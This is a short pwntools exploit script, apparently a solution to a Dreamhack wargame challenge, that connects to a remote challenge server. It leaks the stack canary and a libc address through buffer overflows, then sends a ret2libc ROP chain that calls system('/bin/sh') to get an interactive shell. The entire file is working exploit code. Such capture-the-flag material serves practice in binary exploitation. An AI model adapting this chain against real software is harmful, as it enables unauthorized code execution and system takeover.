from pwn import *

# p = process("./problem2_1")
# p = remote('127.0.0.1', 1234)
p = remote('host3.dreamhack.games', 22705)

pop_rdi = 0x2a3e5
system = 0x50d70
binsh = 0x1d8678  
ret = 0x29139

def slog(sym,val): success(sym+' : '+hex(val))

def M(payload): p.sendlineafter(b">>>",b"M"+payload)

def O(): p.sendlineafter(b">>>",b"O")

def S(): p.sendlineafter(b">>>",b"S")

payload = b"A"*264

M(payload)
O()

p.recvuntil(b'\n')
cnry = u64(b"\x00"+p.recvn(7))

payload = b"A"*279

M(payload)
O()

p.recvuntil(b'\n')
libc_base = u64(p.recvn(6)+b"\x00"*2) - 0x29d90

slog('canary',cnry)
slog("libc_base", libc_base)
slog("binsh",libc_base+binsh)

payload = b"A"*264 + p64(cnry) + b"B"*8 + p64(libc_base+pop_rdi) + p64(libc_base+binsh) + p64(libc_base+ret) + p64(libc_base+system)

M(payload)
S()

p.interactive()
